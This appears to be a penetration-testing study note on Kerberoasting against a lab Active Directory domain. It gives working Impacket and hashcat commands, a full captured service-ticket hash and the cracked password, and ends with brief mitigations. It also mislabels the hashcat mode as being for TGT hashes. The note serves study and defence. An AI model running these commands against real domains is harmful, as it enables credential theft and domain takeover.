
This attack takes advantage of **Service Accounts** using [[Kerberos]]. Once we have compromised and gained access to a domain user, we can use that account to request a TicketGrantingTicket (**TGT**) from a Key Distribution Center (**KDC**).

Once we receive the TGT, we then request a Ticket Granting Server (**TGS**) by presenting out TGT to the Domain Controller. The *TGS will be encrypted with the servers' account hash*. Then we can take this hash to hashcat and crack it to extract the password.

![[Kerberoasting.jpeg]]

## Attacking the SQLService

We have a SQLService running on our DC with a weak password account. We can user this attack to request the hash from a compromised account and then crack it as follow.

```bash
$ sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.23.130 -request 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet      LastLogon 
--------------------------------------  ----------  -----------------------------------------------------------  -------------------  ---------
HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-02-16 10:31:20  <never>   



$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$366c14582a080d0dfd1c0a31fc2f7c1d$fbb81f06c98474b6b38edcfe77f115f448d334538ba569ab0347c9bb37baf2a688f20cfdda0914d66cc5295bbf0cfb0e338013657f4525b6d06b9d32e35d9f3907d63a24ecc4b0b3f6d05e736c4e4bec22f3a5a94f0addb94683d771ee5610306e99936bc5877da9d36c659352c33b29c8e7ef260247dab9cdfa43aed4e845ecee9b5f743c5019dc30ea41a891b0c4c011b820f8773c18c1289d09046e5a0a39953f58e1bfbae819e23e4e1e6baf144334f835532591933f09f332d0b6a500bc27f21d73381c56cfa805af51147af17c968b082fb4f0eafd2198d8051bf3278416cad8836f14548220adc1008f174f86dde4a5f71e9e7a123ad32f05a93f09f15f3870a22c5d3881e4d80c176209aa3c206be9f092b1fdb852ddbf9a6bfa3b4c4498b7f00f46c25f2afac354e83b78fb93deb8a2d1492b88f04fc408c5d846fd4dde6ec322a7869b04d17aaf1d137a44143ccbcef48d1a3a86a4d04e38cd99df1c446ba31730ba3ac7eba2b32a800fc106d607a2ddb7caf5e5a8f62233077e7da18eec6d8c458a933e784d64e280e97a3dd1551627ffbf36cd73cc6ffd4999447ba3e1ed021869d40c811b59169f29e39a8ca203600d69be7e94f514c3528e1992053cf49c7e54c53a67f2a6e9e7dd234d5898da307c97c20201f6c3e62e6aeca061596b06c4669e2fe64827950dcb68982bcc503455e4e61597bad1d75c67c566695fba31647e0d5b51c6fe77137be04bd9f1cf09d6f2887433f0d4840481252a7188c0ff5826cc26efe8414a041181a321f893d539bfc8b3c126766761cbabae8b9f9c86d9ab356777997fbc26489a24098358318f715d2b0215489b0cde2f63064b2dd88842eed8f3f2f9c2104dcb9b6d1224ae74769bb228f9a25bd18d701e286abcd1b3f656b9bc88e9b542c9feaca996057227f648525a9bea53a0a65e34758653448d9d89b0fceefe831ee493f0b4e93a7e387041ca82d1541ee9304de49fc48509726c026cd1ed407f5a2f9336ec741f58dc6bd2a20c111fed304366906abbd74350b1882c29b1c9b5a9c0882cbd333e1f5c0a096a290e457fa8a88b230832638fde20889fbe50fe7c038c9a6c66e80c01269978f36a9b1e01640d5868dc38370a9186cb200f1aaad666f0a87255cf8852526f99660a9b3542a3d86a769d178a8c1ddab5eeebe79b3e4e21bfaa2d0392305bf55c9017f0a2514dcbe0177b9d257c9c9ce4bc24ca453af6134aeaaaf37966c3802144c2b76006ed5ea58ed3ced262c6b2bf8daa688166495eee6b7446855f56fd854f29962d7e2ca25bda654de4de162dd98a249943527b60a2ed4548d36b3047d1322dfb79fafc639940a935d771c0963297345a308c785274530956fb2b1d960efc5410c1c74c4168ef8af5c9f05f752d03dd9b0f1517624093d32bfbe98060804ee819ed
```

Even though it does not mention that this account belongs to the Domain Admin group, we know that from our enumeration results. Hence, this is high value target. Now we take this to `hashcat`. The module for TGT hashes is `13100`

```bash
$ hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 5 PRO 8500GE w/ Radeon 740M Graphics, 2899/5862 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

.
.
.

$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$366c14582a080d0dfd1c0a31fc2f7c1d$fbb81f06c98474b6b38edcfe77f115f448d334538ba569ab0347c9bb37baf2a688f20cfdda0914d66cc5295bbf0cfb0e338013657f4525b6d06b9d32e35d9f3907d63a24ecc4b0b3f6d05e736c4e4bec22f3a5a94f0addb94683d771ee5610306e99936bc5877da9d36c659352c33b29c8e7ef260247dab9cdfa43aed4e845ecee9b5f743c5019dc30ea41a891b0c4c011b820f8773c18c1289d09046e5a0a39953f58e1bfbae819e23e4e1e6baf144334f835532591933f09f332d0b6a500bc27f21d73381c56cfa805af51147af17c968b082fb4f0eafd2198d8051bf3278416cad8836f14548220adc1008f174f86dde4a5f71e9e7a123ad32f05a93f09f15f3870a22c5d3881e4d80c176209aa3c206be9f092b1fdb852ddbf9a6bfa3b4c4498b7f00f46c25f2afac354e83b78fb93deb8a2d1492b88f04fc408c5d846fd4dde6ec322a7869b04d17aaf1d137a44143ccbcef48d1a3a86a4d04e38cd99df1c446ba31730ba3ac7eba2b32a800fc106d607a2ddb7caf5e5a8f62233077e7da18eec6d8c458a933e784d64e280e97a3dd1551627ffbf36cd73cc6ffd4999447ba3e1ed021869d40c811b59169f29e39a8ca203600d69be7e94f514c3528e1992053cf49c7e54c53a67f2a6e9e7dd234d5898da307c97c20201f6c3e62e6aeca061596b06c4669e2fe64827950dcb68982bcc503455e4e61597bad1d75c67c566695fba31647e0d5b51c6fe77137be04bd9f1cf09d6f2887433f0d4840481252a7188c0ff5826cc26efe8414a041181a321f893d539bfc8b3c126766761cbabae8b9f9c86d9ab356777997fbc26489a24098358318f715d2b0215489b0cde2f63064b2dd88842eed8f3f2f9c2104dcb9b6d1224ae74769bb228f9a25bd18d701e286abcd1b3f656b9bc88e9b542c9feaca996057227f648525a9bea53a0a65e34758653448d9d89b0fceefe831ee493f0b4e93a7e387041ca82d1541ee9304de49fc48509726c026cd1ed407f5a2f9336ec741f58dc6bd2a20c111fed304366906abbd74350b1882c29b1c9b5a9c0882cbd333e1f5c0a096a290e457fa8a88b230832638fde20889fbe50fe7c038c9a6c66e80c01269978f36a9b1e01640d5868dc38370a9186cb200f1aaad666f0a87255cf8852526f99660a9b3542a3d86a769d178a8c1ddab5eeebe79b3e4e21bfaa2d0392305bf55c9017f0a2514dcbe0177b9d257c9c9ce4bc24ca453af6134aeaaaf37966c3802144c2b76006ed5ea58ed3ced262c6b2bf8daa688166495eee6b7446855f56fd854f29962d7e2ca25bda654de4de162dd98a249943527b60a2ed4548d36b3047d1322dfb79fafc639940a935d771c0963297345a308c785274530956fb2b1d960efc5410c1c74c4168ef8af5c9f05f752d03dd9b0f1517624093d32bfbe98060804ee819ed:MYpassword123#
```

We can see that we have successfully cracked the password, and it is `MYpassword123#`. Since this was a domain admin, we have compromised the domain!

## Mitigations

1. The best way to prevent this is by having **strong passwords**. This would make it almost impossible to crack them and prevent the attack.
   
2. In addition, service accounts should **not be run as Domain Admins**. Instead, it should only be provided with the relevant permissions.
